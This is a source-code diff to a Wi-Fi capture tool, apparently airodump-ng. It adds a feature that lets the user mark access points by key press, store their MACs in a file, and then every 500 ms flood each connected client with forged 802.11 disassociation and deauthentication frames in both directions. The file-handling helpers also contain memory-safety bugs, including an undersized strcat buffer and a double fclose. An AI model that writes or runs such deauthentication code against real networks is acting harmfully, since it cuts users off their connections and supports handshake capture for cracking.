@@ -96,6 +96,239 @@ uint8_t h80211[4096] __attribute__((aligned(16)));
 uint8_t tmpbuf[4096] __attribute__((aligned(16)));
 
 static const unsigned char llcnull[] = {0, 0, 0, 0};
+#define MAC_STR_LEN 18 //12:34:56:78:90:00
+
+int g_iLastSetChannel = -1;
+static bool Check500msGone(void)
+{
+	static struct timeval timeLast500msPoint = {0};
+	struct timeval cur_time;
+	gettimeofday(&cur_time, NULL);
+	unsigned int time_diff = 1000000
+			* (cur_time.tv_sec - timeLast500msPoint.tv_sec)
+			+ (cur_time.tv_usec - timeLast500msPoint.tv_usec);
+	if (time_diff > 500000)
+	{
+		timeLast500msPoint = cur_time;
+		return 1;
+	}
+	return 0;
+}
+
+int CHECK_REALLY_DEAUTH(struct AP_info *ap_cur)
+{
+	if (ap_cur->m_bUnderAttack)
+	{
+		if ((ap_cur->security & STD_WPA) || (ap_cur->security & STD_WPA2))
+		{
+			return 1;
+		}
+		else
+		{
+			if (ap_cur->deauth_if_OPENorWEP)
+				return 1;
+		}
+	}
+	return 0;
+}
+
+struct wif * wi[MAX_CARDS];
+int deauth_STA_FROM_AP(struct AP_info* pAP, struct ST_info* pST)
+{
+	unsigned int i = 0, gKickCounts = 3;
+	unsigned char bufTmp[26];
+
+///disassociate STA->AP
+	bufTmp[0] = 0xA0;//disassociate
+	bufTmp[1] = 0x00;//normal
+	bufTmp[2] = 0x3A;//duration 1
+	bufTmp[3] = 0x01;//duration 2
+	memcpy(&bufTmp[4],  pAP->bssid, 6);
+	memcpy(&bufTmp[16], pAP->bssid, 6);
+	memcpy(&bufTmp[10], pST->stmac, 6);
+	bufTmp[24] = 0x08;//Reason code: Disassociated because sending STA is leaving (or has left) BSS (0x0008)
+	bufTmp[25] = 0x00;//Reason code: Disassociated because sending STA is leaving (or has left) BSS (0x0008)
+
+	int nb_pkt_sent=0;
+	for(i=0; i<gKickCounts; i++)
+	{
+		nb_pkt_sent++;
+		bufTmp[22] = (nb_pkt_sent & 0x0000000F) << 4;//adjust fragment number, sequence number
+		bufTmp[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
+		if (wi_write(wi[0], NULL, LINKTYPE_IEEE802_11, bufTmp, 26, NULL) == -1)
+		{
+			return 1;
+		}
+	}
+/////////////////////////
+
+///disassociate AP->STA
+		bufTmp[0] = 0xA0;//disassociate
+		bufTmp[1] = 0x00;//normal
+		bufTmp[2] = 0x3A;//duration 1
+		bufTmp[3] = 0x01;//duration 2
+		memcpy(&bufTmp[4],  pST->stmac, 6);
+		memcpy(&bufTmp[16], pAP->bssid, 6);
+		memcpy(&bufTmp[10], pAP->bssid, 6);
+		bufTmp[24] = 0x08;//Reason code: Disassociated because sending STA is leaving (or has left) BSS (0x0008)
+		bufTmp[25] = 0x00;//Reason code: Disassociated because sending STA is leaving (or has left) BSS (0x0008)
+
+		nb_pkt_sent=0;
+		for(i=0; i<gKickCounts; i++)
+		{
+			nb_pkt_sent++;
+			bufTmp[22] = (nb_pkt_sent & 0x0000000F) << 4;//adjust fragment number, sequence number
+			bufTmp[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
+			if (wi_write(wi[0], NULL, LINKTYPE_IEEE802_11, bufTmp, 26, NULL) == -1)
+			{
+				return 1;
+			}
+		}
+/////////////////////////
+
+///deauthenticate AP->STA
+	bufTmp[0] = 0xC0;
+	bufTmp[1] = 0x00;
+	bufTmp[2] = 0x3A;//duration 1
+	bufTmp[3] = 0x01;//duration 2
+	memcpy(&bufTmp[4],  pST->stmac, 6);
+	memcpy(&bufTmp[16], pAP->bssid, 6);
+	memcpy(&bufTmp[10], pAP->bssid, 6);
+	bufTmp[24] = 0x07;
+	bufTmp[25] = 0x00;
+
+	nb_pkt_sent=0;
+	for(i=0; i<gKickCounts; i++)
+	{
+		nb_pkt_sent++;
+		bufTmp[22] = (nb_pkt_sent & 0x0000000F) << 4;//adjust fragment number, sequence number
+		bufTmp[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
+		if (wi_write(wi[0], NULL, LINKTYPE_IEEE802_11, bufTmp, 26, NULL) == -1)
+		{
+			return 1;
+		}
+	}
+/////////////////////////
+
+///deauthenticate STA->AP
+	bufTmp[0] = 0xC0;
+	bufTmp[1] = 0x00;
+	bufTmp[2] = 0x3A;//duration 1
+	bufTmp[3] = 0x01;//duration 2
+	memcpy(&bufTmp[4],  pAP->bssid, 6);
+	memcpy(&bufTmp[16], pAP->bssid, 6);
+	memcpy(&bufTmp[10], pST->stmac, 6);
+	bufTmp[24] = 0x07;
+	bufTmp[25] = 0x00;
+
+	nb_pkt_sent=0;
+	for(i=0; i<gKickCounts; i++)
+	{
+		nb_pkt_sent++;
+		bufTmp[22] = (nb_pkt_sent & 0x0000000F) << 4;//adjust fragment number, sequence number
+		bufTmp[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
+		if (wi_write(wi[0], NULL, LINKTYPE_IEEE802_11, bufTmp, 26, NULL) == -1)
+		{
+			return 1;
+		}
+	}
+/////////////////////////
+	return 0;
+}
+
+void RemoveAPfromDeauthFile(unsigned char* pMAC)
+{
+	FILE* myFile = NULL;
+	char* pBuf = NULL;
+	if ((myFile = fopen("ap_list_deauth.txt", "r")) != NULL)
+	{
+		const int _todo = 118;
+		char strBufMacToRemove[_todo];
+		sprintf(strBufMacToRemove, "%02X:%02X:%02X:%02X:%02X:%02X\n", pMAC[0],
+				pMAC[1], pMAC[2], pMAC[3], pMAC[4], pMAC[5]);
+
+		fseek(myFile, 0, SEEK_END);
+		long int iFileSize = ftell(myFile);
+		rewind(myFile);
+		char* pBuf = malloc(iFileSize);
+		if (pBuf)
+		{
+			pBuf[0] = 0;
+			char strBufMacRead[_todo];
+			while (fgets(strBufMacRead, sizeof(strBufMacRead), myFile))
+			{
+				if (0 != strcasecmp(strBufMacToRemove, strBufMacRead))
+				{ //we have not the MAC to remove, add to file
+					strcat(pBuf, strBufMacRead);
+				}
+			}
+			fclose(myFile);
+			if ((myFile = fopen("ap_list_deauth.txt", "w")) != NULL)
+				fwrite(pBuf, 1, strlen(pBuf), myFile);
+		}
+
+	}
+	if (pBuf)
+		free(pBuf);
+	if (myFile)
+		fclose(myFile);
+}
+
+int CheckAPinDeauthFile(unsigned char* pAPbinaryMAC)
+{
+	int iRet = 0;
+	FILE* myFile;
+	if ((myFile = fopen("ap_list_deauth.txt", "a+")) != NULL)
+	{
+		char strBufNewMac[MAC_STR_LEN + 1];
+		snprintf(strBufNewMac, sizeof(strBufNewMac),
+				"%02X:%02X:%02X:%02X:%02X:%02X\n", pAPbinaryMAC[0],
+				pAPbinaryMAC[1], pAPbinaryMAC[2], pAPbinaryMAC[3],
+				pAPbinaryMAC[4], pAPbinaryMAC[5]);
+
+		char strBufSearchMac[MAC_STR_LEN + 1];
+		while (fgets(strBufSearchMac, sizeof(strBufSearchMac), myFile))
+		{
+			//found
+			if (0 == strncasecmp(strBufSearchMac, strBufNewMac,
+							sizeof(strBufSearchMac) - 1))
+			{
+				iRet = 1;
+				break;
+			}
+		}
+		fclose(myFile);
+	}
+	return iRet;
+}
+
+void AddAPtoDeauthFile(unsigned char* pMAC)
+{
+	FILE* myFile;
+	if ((myFile = fopen("ap_list_deauth.txt", "a+")) != NULL)
+	{
+		char strBufNewMac[32];
+		sprintf(strBufNewMac, "%02X:%02X:%02X:%02X:%02X:%02X\n", pMAC[0],
+				pMAC[1], pMAC[2], pMAC[3], pMAC[4], pMAC[5]);
+
+		//if MAC is already in file, than skip it
+		char strBufSearchMac[MAC_STR_LEN + 1];
+		int bFound = 0;
+		while (fgets(strBufSearchMac, sizeof(strBufSearchMac), myFile))
+		{
+			//found
+			if (0 == strncasecmp(strBufSearchMac, strBufNewMac,
+							sizeof(strBufSearchMac) - 1))
+			{
+				bFound = 1;
+				break;
+			}
+		}
+		if (0 == bFound)
+			fprintf(myFile, "%s", strBufNewMac);
+		fclose(myFile);
+	}
+}
 
 static const char * OUI_PATHS[]
 	= {"./airodump-ng-oui.txt",
@@ -249,6 +482,7 @@ static struct local_options
 	int start_print_ap;
 	int start_print_sta;
 	struct AP_info * p_selected_ap;
+	int mark_cur_ap_to_deauth, unmark_cur_ap_to_deauth;
 	enum
 	{
 		selection_direction_down,
@@ -295,6 +529,8 @@ static void resetSelection(void)
 	lopt.mark_cur_ap = 0;
 	lopt.do_pause = 0;
 	lopt.do_sort_always = 0;
+	lopt.mark_cur_ap_to_deauth = 0;
+	lopt.unmark_cur_ap_to_deauth = 0;
 	memset(lopt.selected_bssid, '\x00', 6);
 }
 
@@ -549,6 +785,11 @@ static void input_thread(void * arg)
 				lopt.en_selection_direction = selection_direction_up;
 			}
 		}
+
+		if (keycode == KEY_ARROW_RIGHT)
+			lopt.mark_cur_ap_to_deauth = 1;
+		else if (keycode == KEY_ARROW_LEFT)
+			lopt.unmark_cur_ap_to_deauth = 1;
 
 		if (keycode == KEY_i)
 		{
@@ -1385,6 +1626,7 @@ static int dump_add_packet(unsigned char * h80211,
 		ap_cur->is_decloak = 0;
 		ap_cur->packets = NULL;
 
+		ap_cur->m_bUnderAttack = CheckAPinDeauthFile(ap_cur->bssid);
 		ap_cur->marked = 0;
 		ap_cur->marked_color = 1;
 
@@ -3590,7 +3832,7 @@ static void dump_print(int ws_row, int ws_col, int if_num)
 	erase_line(0);
 	move(CURSOR_DOWN, 1);
 	CHECK_END_OF_SCREEN();
-
+	bool b500ms_gone = false;
 	if (lopt.show_ap)
 	{
 		strbuf[0] = 0;
@@ -3865,6 +4107,18 @@ static void dump_print(int ws_row, int ws_col, int if_num)
 
 			if (lopt.p_selected_ap && (lopt.p_selected_ap == ap_cur))
 			{
+				if (lopt.mark_cur_ap_to_deauth) {
+					AddAPtoDeauthFile(ap_cur->bssid);
+					lopt.mark_cur_ap_to_deauth = 0;
+					ap_cur->m_bUnderAttack = 1;
+					ap_cur->deauth_if_OPENorWEP = 0;
+				}
+				else if (lopt.unmark_cur_ap_to_deauth) {
+					RemoveAPfromDeauthFile(ap_cur->bssid);
+					lopt.unmark_cur_ap_to_deauth = 0;
+					ap_cur->m_bUnderAttack = 0;
+					ap_cur->deauth_if_OPENorWEP = 0;
+				}
 				if (lopt.mark_cur_ap)
 				{
 					if (ap_cur->marked == 0)
@@ -3886,9 +4140,16 @@ static void dump_print(int ws_row, int ws_col, int if_num)
 				memcpy(lopt.selected_bssid, ap_cur->bssid, 6);
 			}
 
-			if (ap_cur->marked)
-			{
+			if (CHECK_REALLY_DEAUTH(ap_cur)) {
+				if ((b500ms_gone = Check500msGone())) {
+					ap_cur->marked_color++;
+					if (ap_cur->marked_color > (TEXT_MAX_COLOR - 1))
+						ap_cur->marked_color = 1;
+				}
 				textcolor_fg(ap_cur->marked_color);
+			} else {
+				if (ap_cur->marked)
+					textcolor_fg(ap_cur->marked_color);
 			}
 
 			memset(strbuf + len, 32, sizeof(strbuf) - len - 1);
@@ -4027,7 +4288,7 @@ static void dump_print(int ws_row, int ws_col, int if_num)
 			console_puts(strbuf);
 
 			if ((lopt.p_selected_ap && (lopt.p_selected_ap == ap_cur))
-				|| (ap_cur->marked))
+				|| (ap_cur->marked) || CHECK_REALLY_DEAUTH(ap_cur))
 			{
 				textstyle(TEXT_RESET);
 			}
@@ -4092,11 +4353,12 @@ static void dump_print(int ws_row, int ws_col, int if_num)
 				textstyle(TEXT_REVERSE);
 			}
 
-			if (ap_cur->marked)
+			if (ap_cur->marked || CHECK_REALLY_DEAUTH(ap_cur))
 			{
 				textcolor_fg(ap_cur->marked_color);
 			}
 
+			//walk through all stations
 			while (st_cur != NULL)
 			{
 				if (st_cur->base != ap_cur
@@ -4113,6 +4375,24 @@ static void dump_print(int ws_row, int ws_col, int if_num)
 				}
 
 				num_sta++;
+
+				/*
+				 *todo: problems if channel hopper is on, because
+				 *todo: g_iLastSetChannel is not set in the hopper
+				 *todo: currently we have to use a fixed channel
+				 */
+				if (b500ms_gone && CHECK_REALLY_DEAUTH(ap_cur)) {
+					if (g_iLastSetChannel != ap_cur->channel) {
+						if (wi_set_channel(wi[0], ap_cur->channel) == 0) {
+							g_iLastSetChannel = ap_cur->channel;
+						}
+						else {
+							perror("wi_set_channel failed");
+							exit(-1);
+						}
+					}
+					deauth_STA_FROM_AP(ap_cur, st_cur);
+				}
 
 				if (lopt.start_print_sta > num_sta) continue;
 
@@ -4187,7 +4467,7 @@ static void dump_print(int ws_row, int ws_col, int if_num)
 
 			if ((lopt.p_selected_ap
 				 && (memcmp(lopt.selected_bssid, ap_cur->bssid, 6) == 0))
-				|| (ap_cur->marked))
+				|| (ap_cur->marked) || (CHECK_REALLY_DEAUTH(ap_cur)))
 			{
 				textstyle(TEXT_RESET);
 			}
@@ -5794,7 +6074,6 @@ int main(int argc, char * argv[])
 
 	time_t tt1, tt2, start_time;
 
-	struct wif * wi[MAX_CARDS];
 	struct rx_info ri;
 	unsigned char tmpbuf[4096];
 	unsigned char buffer[4096];
